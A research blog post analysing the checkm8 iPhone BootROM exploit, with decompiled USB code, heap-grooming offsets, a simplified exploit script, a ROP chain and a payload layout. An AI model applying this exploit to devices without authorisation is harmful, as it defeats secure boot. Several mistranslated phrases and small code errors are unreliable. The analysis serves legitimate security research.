---
title: Technical Analysis of the checkm8 Exploit
date: 2019-10-05T00:00:00.000Z
excerpt: >-
  An in-depth analysis of checkm8, the BootROM exploit for Apple A5-A11 SoCs:
  the USB DFU stack use-after-free, heap grooming, and AArch64 shellcode execution.
tags:
  - checkm8
  - iphone
  - aarch64
  - ios
  - bootrom
  - uaf
  - jailbreak
  - hardware-security
categories:
  - Research
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

![checkm8 banner](/images/blog/checkm8-technical-analysis/Untitled.png)

The checkm8 vulnerability exploits an uncorrectable flaw in the BootROM of most iDevices, including the iPhone X. This article examines the technical analysis and root cause of the exploit.

## introduction

Before we dive into the exploit, let's briefly understand the iDevice boot process and the role of BootROM (also known as SecureROM).

The boot chain is as follows:

![Boot Chain Diagram](/images/blog/checkm8-technical-analysis/Untitled-1.png)

When the device is turned on, BootROM is the first thing that runs. The main roles are:

- Platform initialization (setting required platform registers, initializing CPU, etc.)
- Validate the next boot phase and transfer control
  - BootROM supports IMG3/IMG4 image parsing
  - BootROM has access to the GID key for image decryption
  - Has built-in Apple public key and encryption capabilities for image verification
- If further booting is not possible, restore your device via Device Firmware Update (DFU)

BootROM is a very small piece of code and can be considered a lightweight version of iBoot, sharing most of its library code with iBoot. Unlike iBoot, BootROM cannot be updated. It is stored in read-only memory when the device is manufactured and acts as the hardware trust root of the Secure Boot chain.

BootROM vulnerabilities could allow attackers to take control of the boot process and execute unsigned code on the device.

![Secure Boot chain](/images/blog/checkm8-technical-analysis/Untitled-2.png)

## History of checkm8

The checkm8 exploit was added to ipwndfu by author axi0mX on September 27, 2019, at the same time a description and additional information about the exploit were released.

The UAF vulnerability in the USB code was discovered while patching the iBoot beta for iOS 12. Since BootROM and iBoot share most of the code, including USB, this vulnerability also exists in BootROM.

As you can see from the exploit code, this vulnerability is triggered in DFU mode. DFU is a mode that transfers a signed image to a device via USB so that it can boot later, and is useful for restoring a device after an update failure.

On the same day, user littlelailo revealed that he discovered the vulnerability in March and posted a description to [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4). The description matches checkm8, but not all exploit details are clear. This article explains all the details of the exploit, from BootROM to payload execution.

The analysis is based on the resources mentioned above, the iBoot/SecureROM source code leaked in February 2018, and experimental data performed on a test device (iPhone 7, CPID: 8010). SecureROM and SecureRAM dumps obtained using checkm8 itself also helped in the analysis.

## Essential knowledge about USB

Since the vulnerability is in the USB code, you need to understand how this interface works. Only the key points most relevant to the exploit are covered here.

There are various types of USB data transfer. In DFU, only **control transfer** mode is used.

In this mode, each transaction consists of three steps:

- **Setup Stage** — Setup packets are transmitted. It contains the following fields:
  - `bmRequestType` — Defines the direction, type, and recipient of the request.
  - `bRequest` — defines the request itself
  - `wValue`, `wIndex` — interpreted on request
  - `wLength` — Specifies the length of data transmitted from the Data Stage
- **Data Stage** — Optional data transfer stage. Depending on the setup packet, data is transmitted in the direction of host → device (OUT) or device → host (IN). Data is transferred in small chunks (0x40 bytes for Apple DFU).
  - If the host wants to send more data, send data after the OUT token
  - When the host is ready to receive data from the device, it sends an IN token to the device.
- **Status Stage** — This is the final stage, where the overall transaction status is reported.
  - For OUT requests: the host sends an IN token and the device responds with a 0-length packet
  - For IN requests: host sends OUT token and length 0 packet

The schema below shows OUT and IN requests (omitting ACK, NACK, etc. handshake packets):

![USB transaction schema](/images/blog/checkm8-technical-analysis/Untitled-3.png)

## apollo.txt analysis

This document describes the DFU mode algorithm. Basically, all BootROMs analyzed by littlelailo have the following bugs:

1. When USB starts fetching images through DFU, DFU registers an interface that handles all commands and allocates input/output buffers.
2. When data is transmitted to DFU, the Setup packet is processed by the main code and the interface code is called.
3. The interface code checks whether `wLength` is shorter than the input/output buffer length, and if so, updates the address of the input/output buffer to the pointer passed as an argument.
4. It then returns the data length you want to receive.
5. The USB main code updates global variables with the corresponding length and prepares to receive data packets.
6. When a data packet is received, it is written to the input/output buffer through a pointer passed as an argument, and the number of bytes received is tracked using another global variable.
7. Once all data has been received, DFU-specific code is called again to copy the I/O buffer contents to a memory location where the image will later be booted.
8. The USB code initializes all variables and processes the next packet.
9. When DFU terminates, the output buffer is released, and if image parsing fails, BootROM reinitializes DFU.

Compare these steps with the iBoot source code and the results of reversing the iPhone 7's SecureROM in IDA.

When initializing DFU, input/output buffers are allocated and a USB interface is registered for handling DFU requests:

```c
__int64 usb_dfu_init(){
    if(usb_dfu_inited & 1)
        return 0;
    io_buffer = memalign(0x800, 0x40); // IO-buffer assignment
    bzero(io_buffer, 0x800);

    unk_180088AD4[6] = [0,50,0,0,2,0];
    unk_180088AC0 = 0;
    byte_180088AC2[0] = 2;
    unk_180088AC8 = -1;

    // DFU To process your request USB Interface registration
    sub_10000AED4((__int64)&unk_180088AF0, 1, 0);
    usb_dfu_interface_instance.field_0 = 1;
    usb_dfu_interface_instance.field_8 = (__int64)&dword_100018794;
    usb_dfu_interface_instance.field_10 = 1;
    usb_dfu_interface_instance.field_18 = (__int64)byte_10001879D;
    usb_dfu_interface_instance.field_70 = (__int64)byte_1000E2DC;

    usb_dfu_interface_instance.request_handler = (__int64)handle_interface_request;
    usb_dfu_interface_instance.data_received_handler = (__int64)data_received;
    usb_core_register_interface(&usb_dfu_interface_instance);
    usb_dfu_inited = 1;
    return 0;
}
```

When a SETUP packet for a DFU request comes in, the corresponding interface handler is called. For OUT requests (e.g. sending an image), the handler must return the input/output buffer address and the length of data to be received:

```c
// Get interface control request handler
request_handler = ep.registered_interfaces[(unsigned __int16)setup_request.wIndex]->request_handler;
if(!request_handler)
    goto LABEL_50;
// Call interface control request handler
// Set global buffer pointer
request_handler(&g_setup_request, &ep0_data_phase_buffer);
if( !(g_setup_request.bmRequestType & 0x80000000)){
    if(request_handler_ret >= 1){
        ep0_data_phase_length = request_handler_ret; // Set global length
        ep0_data_phase_if_num = intf_num;
        goto LABEL_101;
    }
    if(!request_handler_ret){
        sub_10000DB0C();
        goto LABEL_101;
    }
LABEL_50:
    sub_10000CF3C();
    *_data_phase = 0;
    return;
LABEL_101:
    if(g_setup_request.bmRequestType & 0x80){
        if((g_setup_request.bmRequestType & 0x80) != 0x80)
            return
        need_data_phase = 1; // data phase activate
    }else{
        need_data_phase = *(unsigned __int64 *)&g_setup_request >> 48 != 0;
    }
    *_data_phase = need_data_phase;
}
```

The DFU interface handler verifies the request and, if valid, returns the input/output buffer address (via output parameters) and the expected data length:

```c
excepted_length = (unsigned __int16)setup_request->wLength;
    if((DWORD)expected_length){
        if((unsigned int)excepted_length >= 0x801){
            dword_180088AD4 = 12815; // 0x320F
            word_180088AD8 = 2;
            byte_180088AC2[0] = 2;
            return -1;
        }
        *out_buffer = io_buffer; // Returns a buffer pointer via argument
    }else{
        dword_180088AD4 = 12800; // 0x3200
        word_180088AD8 = 6;
        byte_180088AC2[0] = 6;
    }
    dfu_excepted_length = excepted_length;
    return excepted_length;
}
```

During the Data Stage, after each data chunk is written to the input/output buffer, the buffer pointer and receive counter are updated. Once all expected data has been received, the interface's data-received handler is called and global state is initialized:

```c
*data_phase = 0;
    if( !(is_setup & 1)){
        if(!data_rcvd)
            return;
        if(ep0_data_phase_rcvd + data_rcvd <= ep0_data_phase_length){
            if(ep0_data_phase_length - ep0_data_phase_rcvd >= data_rcvd)
                to_copy = data_rcvd;
            else
                to_copy = ep0_data_phase_length - ep0_data_phase_rcvd;
            memcpy(ep0_data_phase_buffer, ep0_rx_buffer, to_copy); // receive data IO-buffercopy to
            ep0_data_phase_buffer += (unsigned int)to_copy; // Update global buffer pointer
            ep0_data_phase_rcvd += to_copy; // Receive counter update
            *data_phase = 1;
            // Expected bytes received completed or 0x40 Stop sending when fewer than bytes are received
            if(data_rcvd == 0x40)
                end_of_transfer = ep0_data_phase_rcvd == ep0_data_phase_length;
            else
                end_of_transfer = 1;
            if(!end_of_transfer)
                return;
            if(!(ep0_data_phase_if_num & 0x80000000) && ep0_data_phase_if_num < registered_interfaces_count){
                // interface data received Get handler
                data_received_handler = ep.registered_interfaces[ep0_data_phase_if_num]->data_received_handler;
                if(data_received_handler){
                    data_received_handler(ep0_data_phase_rcvd);
                    usb_core_send_zlp();
                }
            }
        }else{
            sub_10000CF3C();
        }
        // Initializing global state
        ep0_data_phase_rcvd = 0;
        ep0_data_phase_length = 0;
        ep0_data_phase_buffer = 0;
        ep0_data_phase_if_num = -2;
        *data_phase = 0;
        return;
    }
}
```

Data received from the DFU data handler is moved to a memory area (called `INSECURE_MEMORY` in the iBoot source code) where the image will later be loaded:

```c
*(QWORD *)&received = sub_10000AEE8(&unk_180088AF0);
    goto data_received;
}
*(QWORD *)&received = memcpy(*image_buffer[total_received], io_buffer, received); // IO-buffer image connection
dfu_excepted_length = 0;
dword_180088AD4 = 12800; // 0x3200
total_received += received;
```

When the device exits DFU mode, previously allocated I/O buffers are released.

If the image is successfully acquired in DFU mode, it will boot after verification. If an error occurs or the image cannot boot, DFU will reinitialize and the entire process will repeat from the beginning.

**A Use-After-Free vulnerability exists in the described algorithm.** If a SETUP packet for image upload is sent and the transaction is completed by skipping the Data Stage, the global state will remain initialized in the next DFU cycle and can be written to the I/O buffer address allocated in the previous DFU iteration. This is UAF.

Now that you understand how UAF works, the question is what and how you can overwrite it in the next DFU iteration. Before DFU reinitialization, all resources from the previous iteration are freed, and memory allocation must be exactly the same in the new iteration (heap feng-shui).

As a result, there is another memory leak that allows UAF to be exploited.

## checkm8 analysis

Now let's look at checkm8 itself. For illustration purposes, we will use a simplified version of the exploit targeting the iPhone 7. All platform-specific code was removed, and the order and type of USB requests were changed without affecting functionality. The payload configuration code has also been removed and can be found in the original `checkm8.py`.

```python
#!/usr/bin/env python

from checkm8 import *

def main():
    print '*** checkm8 exploit by axi0mX ***'

    device = dfu.acquire_device(1800)
    start = time.time()
    print 'Found:', device.serial_number
    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return

    payload, - = exploit_config(device.serial_number)
    t8010_nop_gadget = 0x10000CC6C
    callback_chain = 0x1800B0800
    t8010_overwrite = '\0' * 0x5c0
    t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)

    # heap massage
    stall(device)
    leak(device)
    for i in range(6):
        no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    # global state settings and USB re-start
    device = dfu.acquire_device()
    device.serial_number
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    # heap Occupy/Spray
    device = dfu.acquire_device()
    device.serial_number
    stall(device)
    leak(device)
    leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)

    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    if 'PWND:[checkm8]' not in device.serial_number:
        print 'ERROR : Exploit failed. Device did not enter pwned DFU Mode'
        sys.exit(1)
    print 'Device is now in pwned DFU Mode'
    print '(%0.2f seconds)'%(time.time() - start)
    dfu.release_device(device)

if __name__ == '__main__':
    main()
```

The operation of checkm8 consists of several steps:

1. Hip Feng-shui
2. Allocate and deallocate input/output buffers without initializing global state
3. Overwrite `usb_device_io_request` on heap via UAF
4. Payload placement
5. Callback chain execution
6. Shellcode execution

### 1. Hip Feng-shui

This is the most interesting step and will be explained in the most detail.

```python
stall(device)
leak(device)
for i in range(6):
    no_leak(device)
dfu.usb_reset(device)
dfu.release_device(device)
```

The purpose of this step is to arrange the heap in a way that makes good use of the heap UAF.

Helper functions are defined as follows:

```python
def stall(device):
    libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A'*0xC0, 0.00001)
def leak(device):
    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device):
    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
```

`libusb1_no_error_ctrl_transfer` is a wrapper surrounding `device.ctrlTransfer` and ignores all exceptions that occur during request execution.

`libusb1_async_ctrl_transfer` is libusb's `libusb_submit_transfer` wrapper for asynchronous request execution.

Parameters passed to the call:

- device number
- SETUP packet data:
  - `bmRequestType`
  - `bRequest`
  - `wValue`
  - `wIndex`
- Data Stage data or data length (`wLength`)
- request timeout

Parameters shared across all three request types:

- `bmRequestType = 0x80`
  - `0b1XXXXXXX` — Data Stage Direction: Device → Host
  - `0bX00XXXXX` — Standard request type
  - `0bXXX00000` — Device is the recipient
- `bRequest = 6` — GET_DESCRIPTOR
- `wValue = 0x304`
  - `wValueHigh = 0x3` — Descriptor Type: String (USB_DT_STRING)
  - `wValueLow = 0x4` — String descriptor index 4 (device serial number)
- `wIndex = 0x40A` — String language identifier (value is independent of exploit)

Request object structure (0x30 byte allocation):

![usb_device_io_request structure](/images/blog/checkm8-technical-analysis/Untitled-4.png)

The fields of most interest are `callback` and `next`:

- `callback` — Pointer to a function to be called upon completion of the request.
- `next` — A pointer to the next object of the same type; Used to configure request queue

The main function of `stall` is to execute requests asynchronously with minimal timeout. If you're lucky, the request is canceled at the OS level and remains in the run queue, preventing the transaction from completing. The device continues to receive all scheduled SETUP packets and places them in the run queue as needed.

In experiments using an Arduino USB controller, we confirmed that for a successful exploit, the host must send a SETUP packet and an IN token and then cancel the transaction with a timeout.

This unfinished transaction looks like:

![Incomplete stall transaction](/images/blog/checkm8-technical-analysis/Untitled-5.png)

The request length differs by only one unit. Standard requests have the following terminal callbacks:

```c
usb_device_io_request * standard_device_request_cb(usb_device_io_request * request){
    unsigned int io_length; // w8

    io_length = result->io_length;
    if(io_length && !(io_length & 0x3F) && (unsigned __int16)g_setup_request.wLength > io_length)
        result = (usb_device_io_request *)usb_core_send_zlp();
    return result;
}
```

The `io_length` value is the minimum value between `wLength` in the request's SETUP packet and the original length of the requested descriptor. Since the descriptor is quite long, `io_length` can be controlled within that length range.

The `g_setup_request.wLength` value is the same as the `wLength` of the most recent SETUP packet, in this case `0xC1`.

Therefore, when a request in the form of `stall` or `leak` is completed, the conditions of the terminal callback function are met and `usb_core_send_zlp()` is called. This call creates a length 0 packet request and adds it to the run queue.

This is necessary to correctly complete the transaction in the Status Stage.

The `usb_core_complete_endpoint_io` function completes the request: first calls the callback, then frees the request memory. The request is completed upon completion of the entire transaction as well as upon USB reset.

When a reset signal is received, all requests in the run queue are completed.

When releasing a request later through the cleanup loop, you can optionally call `usb_core_send_zlp()` to gain enough heap control for UAF. The cleanup loop is as follows:

```c
aborted_list = ep->io_head;
ep->io_head = 0;
ep->io_tail = 0;
exit_critical_section();
while(aborted_list){
    v16 = aborted_list->next;
    aborted_list->status = 1;
    usb_core_complete_endpoint_io(aborted_list);
    aborted_list = v16;
}
```

When the queue is empty, canceled requests are executed and completed by `usb_core_complete_endpoint_io`. Requests assigned with `usb_core_send_zlp` are placed in `ep->io_head`.

When the USB reset is complete, all endpoint information, including `io_head`/`io_tail` pointers, is initialized, and a 0-length request remains in the heap. This allows small chunks to be created on the heap.

The schema below demonstrates this method:

![Heap manipulation schema](/images/blog/checkm8-technical-analysis/Untitled-6.png)

A new memory area is allocated from the smallest suitable free chunk in the SecureROM heap. By creating small empty chunks using the method described above, you can control memory allocation during USB initialization, including `io_buffer` and request allocation.

To understand this better, let's look at what allocations are made to the heap during DFU initialization. Through iBoot source code analysis and SecureROM reversal, we identified the following sequence:

1. String descriptor allocation:
   - 1.1 Nonce (size 234)
   - 1.2 Manufacturer (22)
   - 1.3 Product (62)
   - 1.4 Serial Number (198)
   - 1.5 Configuration string (62)

2. Assignments related to creating a USB controller task:
   - 2.1 Task structure (0x3c0)
   - 2.2 Task stack (0x1000)

3. `io_buffer` (0x800)

4. Configuration descriptors:
   - 4.1 High-Speed (25)
   - 4.2 Full-Speed (25)

Then the request structure is allocated. If there are small chunks in the heap, some allocations in the first category are moved, and all subsequent allocations are also moved. This allows overflow with `usb_device_io_request` by referencing the previous buffer.

The results are as follows:

![Hip layout after grooming](/images/blog/checkm8-technical-analysis/Untitled-7.png)

To calculate the required offsets, all allocations listed above were emulated with a slightly modified version of the iBoot heap source code:

```c
#include "heap.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

#ifndef NOLEAK
#define NOLEAK (8)
#endif

int main() {
    void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    printf("chunk = %p\n", chunk);
    heap_add_chunk(chunk, 0x100000, 1);
    malloc(0x3c0); // SecureRAMAlign address low byte in

    void * descs[10];
    void * io_req[100];
    descs[0] = malloc(234); // Nonce
    descs[1] = malloc(22);  // Manufacturer
    descs[2] = malloc(62);  // Product
    descs[3] = malloc(198); // Serial Number
    descs[4] = malloc(62);  // Configuration string

    const int N = NOLEAK; // 8

    void * task = malloc(0x3c0);    // Task Structure
    void * task_stack = malloc(0x4000); // Task Stack

    void * io_buf_0 = memalign(0x800, 0x40); // io_buffer
    void * hs = malloc(25); // High-Speed Configuration descriptor
    void * fs = malloc(25); // Full-Speed Configuration descriptor

    void * zlps[2];

    for(int i = 0; i < N; i++) // io_queue assignment
    {
        io_req[i] = malloc(0x30);
    }

    for(int i = 0; i < N; i++) // 2Turn off all but dogs
    {
        if(i < 2)
        {
            zlps[i] = malloc(0x30);
        }
        free(io_req[i]);
    }

    // ... (second round allocation)

    printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0);
    printf("hs_off  = %#lx\n", (int64_t)hs - (int64_t)io_buf_0);
    printf("fs_off  = %#lx\n", (int64_t)fs - (int64_t)io_buf_0);

    return 0;
}
```

output of power:

```
chunk = 0x1004000
...
io_req_off = 0x5c0
hs_off  = 0x4c0
fs_off  = 0x540
```

As you can see, another `usb_device_io_request` appears at offset `0x5c0` from the start of the previous buffer.

This corresponds directly to the exploit code:

```python
t8010_overwrite = '\0' * 0x5c0
t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)
```

We can verify these conclusions by analyzing the current state of the SecureRAM heap provided with checkm8. I wrote a simple script to parse the heap dump and enumerate the chunks. Some metadata is damaged during the `usb_device_io_request` overflow process, so the corresponding chunk is skipped.

```python
#!/usr/bin/env python3

import struct
from hexdump import hexdump

with open('HEAP', 'rb') as f:
    heap = f.read()

cur = 0x4000

def parse_header(cur):
    _, _, _, _, this_size, t = struct.unpack('<QQQQQQ', heap[cur:cur + 0x30])
    is_free = t & 1
    prev_free = (t >> 1) & 1
    prev_size = t >> 2
    this_size *= 0x40
    prev_size *= 0x40
    return this_size, is_free, prev_size, prev_free

while True:
    try:
        this_size, is_free, prev_size, prev_free = parse_header(cur)
    except Exception as ex:
        break
    print('chunk at', hex(cur + 0x40))
    if this_size == 0:
        if cur in (0x9180, 0x9200, 0x9280):  # Skip corrupted chunks
            this_size = 0x80
        else:
            break
    print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free)
    hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)])
    cur += this_size
```

The low-order bytes of the output match the emulation result.

It is also possible to overflow the High-Speed/Full-Speed ​​configuration descriptor immediately following `io_buffer`. One field in the configuration descriptor is responsible for the entire length, and overflowing it can result in reading beyond the descriptor. You can modify the exploit and experiment with it yourself.

### 2. Allocate and free io_buffer without initializing global state

```python
device = dfu.acquire_device()
device.serial_number
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
dfu.release_device(device)
```

At this stage, an incomplete OUT request is created for image upload.

At the same time, the global state is initialized and the heap's buffer address is written to `io_buffer`. DFU is reset with a `DFU_CLR_STATUS` request and a new DFU iteration begins.

### 3. Overwrite usb_device_io_request on heap via UAF

```python
device = dfu.acquire_device()
device.serial_number
stall(device)
leak(device)
leak(device)
libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
```

At this stage, the `usb_device_io_request` object is allocated on the heap and overflowed with `t8010_overwrite`.

This override content was defined in the first step.

`t8010_nop_gadget` and `0x1800B0800` are values ​​that must overflow the `callback` and `next` fields of the `usb_device_io_request` structure.

`t8010_nop_gadget` is as follows. Contrary to its name, in addition to a simple return, it restores the previous LR register and skips the call to `free` after the callback of `usb_core_complete_endpoint_io`. This is important because the overflow corrupts the heap metadata so that a `free` attempt can be exploited:

```
bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0]  // fp, lr restore
bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20
bootrom:000000010000CC74 RET
```

`next` points to `INSECURE_MEMORY + 0x800`. INSECURE_MEMORY stores the exploit payload for later, and the callback chain is located at payload offset `0x800`.

### 4. Payload placement

```python
for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
```

All subsequent packets are placed in the memory area allocated to the image. Payload layout:

```
0x1800B0000: t8010_shellcode              # Initialization shellcode
...
0x1800B0180: t8010_handler               # bird USB request handler
...
0x1800B0400: 0x1000006a5                 # FALSE translation table descriptor
                                         # SecureROM: 0x100000000 -> 0x100000000
                                         # text translation tablematches the value of
...
0x1800B0600: 0x60000180000625            # FALSE translation table descriptor
                                         # SecureRAM: 0x180000000 -> 0x180000000
                                         # text translation tablematches the value of
0x1800B0608: 0x1800006a5                 # FALSE translation table descriptor
                                         # new value: 0x182000000 -> 0x180000000
                                         # Includes permission to execute code
0x1800B0610: disable_wxn_arm64           # WXN deactivation code
0x1800B0800: usb_rop_callbacks           # callback chain
```

### 5. Callback chain execution

```python
dfu.usb_reset(device)
dfu.release_device(device)
```

After USB reset, a loop begins to cancel unfinished `usb_device_io_request` items in the queue through the linked list. By replacing the remaining queues in the previous step, we can now control the callback chain. To construct this chain we use the following gadgets:

```
bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address
bootrom:000000010000CC50 LSL W2, W2, W9
bootrom:000000010000CC54 MOV X0, X8 ; arg0
bootrom:000000010000CC58 BLR X10   ; call
bootrom:000000010000CC5C CMP W0, #0
bootrom:000000010000CC60 CSEL W0, W0, W19, LT
bootrom:000000010000CC64 B   loc_10000CC6C
```

As you can see, the call address and first argument are loaded at offset `0x70` in the request structure. This gadget allows you to easily execute arbitrary `f(x)` type calls.

The entire call chain can be emulated with the Unicorn Engine (I used a modified version of the uEmu plugin):

![Callback chain emulation](/images/blog/checkm8-technical-analysis/Untitled-8.png)

Full chain for iPhone 7:

#### 5.1. dc_civac 0x1800B0600

```
000000010000046C: SYS #3, c7, c14, #1, X0
0000000100000470: RET
```

Cleans and invalidates the processor cache at virtual addresses. Afterwards, the processor address is made to point to the payload.

#### 5.2. dmb

```
0000000100000478: DMB SY
000000010000047C: RET
```

It is a memory barrier that ensures that all memory operations prior to this instruction are completed. High-performance processors can execute instructions out-of-order for optimization purposes, which is prevented.

#### 5.3. enter_critical_section()

The interrupt is then masked for atomic execution of the task.

#### 5.4. write_ttbr0(0x1800B0000)

```
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1
00000001000003E8: ISB
00000001000003EC: RET
```

Set TTBR0_EL1 to `0x1800B0000` — INSECURE_MEMORY address where the exploit payload is stored. Translation descriptors are located at specific offsets in the payload:

```
0x1800B0400: 0x1000006a5       0x100000000 -> 0x100000000 (rx)
...
0x1800B0600: 0x60000180000625  0x180000000 -> 0x180000000 (rw)
0x1800B0608: 0x1800006a5       0x182000000 -> 0x180000000 (rx)
```

#### 5.5. tlbi

```
0000000100000434: DSB SY
0000000100000438: SYS #0, c8, c7, #0
000000010000043C: DSB SY
0000000100000440: ISB
0000000100000444: RET
```

The translation table is invalidated to translate addresses according to the new translation table.

#### 5.6. 0x1820B0610 — disable_wxn_arm64

```
MOV  X1, #0x180000000
ADD  X2, X1, #0xA0000
ADD  X1, X1, #0x625
STR  X1, [X2,#0x600]
DMB  SY

MOV  X0, #0x100D
MSR  SCTLR_EL1, X0
DSB  SY
ISB

RET
```

WXN (Write permission implies Execute-Never) is disabled so that code can be executed in RW memory. The translation table has been modified to allow this WXN disabling code to be executed.

#### 5.7. write_ttbr0(0x1800A0000)

```
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1
00000001000003E8: ISB
00000001000003EC: RET
```

The original value of TTBR0_EL1 is restored. Since the INSECURE_MEMORY data is overwritten, the BootROM must operate correctly during virtual address translation.

#### 5.8. tlbi

The translation table is reset again.

#### 5.9. exit_critical_section()

Interrupt handling returns to normal.

#### 5.10. 0x1800B0000

Control is transferred to the initialization shellcode.

Therefore, the main purpose of the callback chain is to disable WXN and transfer control to the shellcode in RW memory.

### 6. Execute shellcode

The shellcode is located in `src/checkm8_arm64.S` and performs the following steps:

#### 6.1. Overwrite USB configuration descriptor

Pointers to two configuration descriptors (`usb_core_hs_configuration_descriptor`, `usb_core_fs_configuration_descriptor`) in the heap are stored in global memory. In step 3, these descriptors were corrupted. The shellcode restores this as it is required for proper interaction with USB devices.

#### 6.2. Change USB serial number

A new string descriptor is created with the `"PWND:[checkm8]"` substring added to the serial number. Through this, you can check whether the exploit was successful.

#### 6.3. Overwriting the USB request handler pointer

The interface's original USB request handler pointer is overwritten with the new handler's pointer. The new handler is then placed in memory.

#### 6.4. Copy USB request handler to TRAMPOLINE memory area (0x1800AFC00)

When a USB request is received, the new handler compares the request's `wValue` to `0xffff`. If they are not the same, control is transferred to the original handler. If they are the same, various commands such as `memcpy`, `memset`, and `exec` series functions can be executed in the new handler (effectively controlling the PC).

**This completes the exploit analysis.**

## Implementing a USB low-level exploit

As a bonus example of a USB low-level attack, the checkm8 PoC on Arduino using USB Host Shield has been released. The PoC works on iPhone 7 and is easily portable to other devices. When you connect your iPhone 7 in DFU mode to the USB Host Shield, all steps described in this article will be executed and the device will enter `PWND:[checkm8]` mode. Afterwards, you can connect it to your PC via USB and use ipwndfu (memory dump, access encryption key, etc.).

This method is more reliable than using asynchronous requests with minimal timeout because it communicates directly with the USB controller.

![Arduino USB Host Shield PoC](https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg)

## conclusion

This vulnerability continues to impact the jailbreak community. checkra1n, a checkm8-based jailbreak, was already under development, and since this vulnerability cannot be patched, it always works on vulnerable chips (A5 to A11) regardless of iOS version. There are also many affected devices, including Apple Watch and Apple TV.

In addition to jailbreaking, this vulnerability also has significant implications for researchers studying Apple devices. With checkm8, you can already boot iOS devices in verbose mode, dump SecureROM, or decrypt firmware images with a GID key. However, the most interesting application is to enter debug mode on a vulnerable device using a special JTAG/SWD cable. Previously, this was only possible with special prototype hardware or the help of professional services. checkm8 has made researching Apple hardware much easier and more accessible.

## References

1. Jonathan Levin, [*OS Internals: iBoot*](http://newosxbook.com/bonus/iBoot.pdf)
2. Apple, [iOS Security Guide](https://support.apple.com/guide/security/welcome/web)
3. littlelailo, [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4)
4. [usb.org](http://usb.org/)
5. [USB in a NutShell](https://www.beyondlogic.org/usbnutshell/usb1.shtml)
6. [ipwndfu](https://github.com/axi0mX/ipwndfu)
7. [ipwndfu fork by LinusHenze](https://github.com/LinusHenze/ipwndfu_public)
